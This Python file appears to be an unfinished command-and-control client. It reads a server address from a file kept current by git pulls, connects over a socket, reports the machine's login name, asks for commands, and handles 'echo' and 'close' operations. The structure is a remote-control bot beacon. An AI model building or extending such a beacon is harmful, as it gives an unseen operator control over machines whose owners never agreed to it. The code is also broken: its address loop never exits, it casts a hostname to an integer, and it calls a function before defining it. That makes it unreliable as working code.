import json
import git
import time
import os
import socket

def search_server_to_connect():
    opened = False
    while not opened:
        try:
            f=open("setup\\address.txt","r")
            text = f.read()
            host, port = text.split(":")
        except:
            time.sleep(20)
            pull()
    return int(host),int(port)

target_host, target_port = search_server_to_connect()
hostname = os.getlogin()


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connected = False
while not connected:
    try:
        client.connect((target_host,target_port))
        connected = True
    except:
        print("errore connessione")
    time.sleep(3)

close = False

msg = "Hello! i'm " + hostname + " give me commands"
client.send(msg.encode())
while not close:

    response = (client.recv(4096)).decode()
    response_json = json.loads(response)
    print(response_json)
    if response_json["op"] == "echo":
        client.send(response_json["args"].encode())
    elif response_json["op"] == "close":
        client.close()
        close = True

def pull():
    repo = git.Repo('./')
    o = repo.remotes.origin
    o.pull()
